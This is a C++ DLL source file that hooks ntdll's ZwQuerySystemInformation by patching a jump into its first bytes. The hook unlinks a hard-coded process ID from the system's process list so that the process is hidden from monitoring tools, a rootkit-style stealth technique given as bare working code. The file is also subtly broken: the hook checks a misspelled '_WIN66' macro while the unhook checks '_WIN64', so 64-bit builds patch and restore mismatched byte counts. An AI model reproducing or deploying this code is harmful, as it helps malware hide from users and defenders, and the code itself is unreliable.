// hide_ZwQuerySystemInformation.cpp : Defines the exported functions for the DLL application.
//
#pragma comment (lib, "ntdll")

#include "stdafx.h"


BYTE g_OldData32[5] = { 0 };
BYTE g_OldData64[12] = { 0 };

typedef NTSTATUS (*type_ZwQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

void HookApi();
void UnHookApi();

NTSTATUS NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLen,
	PULONG RtnLen
	) {
	NTSTATUS status = 0;
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
	// pid wanna hide
	DWORD dwPid = 2660;
	// unhook api. if don't do this, this function may be invoked in different threads at the same time, causing chaos in process information traverse
	UnHookApi();
	// get address of ZwQuerySystemInformation
	HMODULE hModule = ::GetModuleHandle(L"ntdll.dll");
	if (hModule == NULL) {
		return status;
	}
	type_ZwQuerySystemInformation ZwQuerySystemInformation = (type_ZwQuerySystemInformation)::GetProcAddress(hModule, "ZwQuerySystemInformation");
	if (ZwQuerySystemInformation == NULL) {
		return status;
	}
	// invoke original function
	status = ZwQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLen, RtnLen);
	//0x05	SystemProcessInformation -> if query process information
	if (NT_SUCCESS(status) && SystemInformationClass == 5) {
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE) {
			// desired process
			if ((DWORD)pCur->UniqueProcessId == dwPid) {
				// set pPrev->NextEntryOffset
				if (pCur->NextEntryOffset == 0) {
					pPrev->NextEntryOffset = 0;
				} else {
					pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
			} else {
				pPrev = pCur;
			}
			if (pCur->NextEntryOffset == 0) {
				break;
			}
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pCur + pCur->NextEntryOffset);
		}
	}
	HookApi();
	return status;
}

void HookApi() {
	// get module
	HMODULE hModule = ::GetModuleHandle(L"ntdll.dll");
	if (hModule == NULL) {
		printf("no module\n");
		return;
	}
	// get func
	type_ZwQuerySystemInformation ZwQuerySystemInformation = (type_ZwQuerySystemInformation)::GetProcAddress(hModule, "ZwQuerySystemInformation");
	if (ZwQuerySystemInformation == NULL) {
		printf("no func\n");
		return;
	}
	// save old data and construct instruction for replacement (in pData)
#ifndef _WIN66
	printf("use 5\n");
	BYTE pData[5] = { 0xe9, 0, 0, 0, 0 };
	DWORD dwOffset = (DWORD)NewZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - 5;
	::RtlCopyMemory(&pData[1], &dwOffset, sizeof(dwOffset));
	::RtlCopyMemory(g_OldData32, ZwQuerySystemInformation, sizeof(pData));
#else
	printf("use 12\n");
	BYTE pData[12] = { 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0 }; // 0xff 0xe0 - jmp rax
	ULONGLONG ullOffset = (ULONGLONG)NewZwQuerySystemInformation;
	::RtlCopyMemory(&pData[2], &ullOffset, sizeof(ullOffset));
	::RtlCopyMemory(g_OldData64, ZwQuerySystemInformation, sizeof(pData));
#endif
	// change property of memory page
	DWORD dwOldProtect = 0;
	::VirtualProtect(ZwQuerySystemInformation, sizeof(pData), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// write
	::RtlCopyMemory(ZwQuerySystemInformation, pData, sizeof(pData));
	// recover page property
	::VirtualProtect(ZwQuerySystemInformation, sizeof(pData), dwOldProtect, &dwOldProtect);
}

void UnHookApi() {
	// get module
	HMODULE hModule = ::GetModuleHandle(L"ntdll.dll");
	if (hModule == NULL) {
		return;
	}
	// get func
	type_ZwQuerySystemInformation ZwQuerySystemInformation = (type_ZwQuerySystemInformation)::GetProcAddress(hModule, "ZwQuerySystemInformation");
	if (ZwQuerySystemInformation == NULL) {
		return;
	}
	DWORD dwOldProtect = 0;
	::VirtualProtect(ZwQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);
#ifndef _WIN64
	::RtlCopyMemory(ZwQuerySystemInformation, g_OldData32, sizeof(g_OldData32));
#else
	::RtlCopyMemory(ZwQuerySystemInformation, g_OldData64, sizeof(g_OldData64));
#endif
	::VirtualProtect(ZwQuerySystemInformation, 12, dwOldProtect, &dwOldProtect);
}